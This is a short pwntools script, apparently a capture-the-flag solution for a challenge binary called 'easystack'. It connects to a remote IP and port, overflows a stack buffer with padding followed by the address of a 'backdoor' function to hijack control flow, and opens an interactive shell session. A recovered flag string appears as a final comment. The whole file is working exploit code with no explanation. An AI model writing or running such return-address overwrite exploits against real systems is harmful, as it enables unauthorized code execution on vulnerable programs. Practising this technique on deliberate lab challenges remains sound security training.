from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
elf =ELF('./easystack')
io = remote('81.70.89.91',57001)
#io = process('./easystack')
ru = io.recvuntil
sla = io.sendlineafter
sl =io.sendline
#vul_addr = 0x4006f9
back_door = elf.symbols['backdoor']

ru('hello!!!please give me your name')
payload = 'a'*0x60+'b'*0x08+p64(back_door).decode("iso-8859-1")
sl(payload)
io.interactive()
io.close()
#hillstone{N3Ur0N_H1ll5t0n3_666!}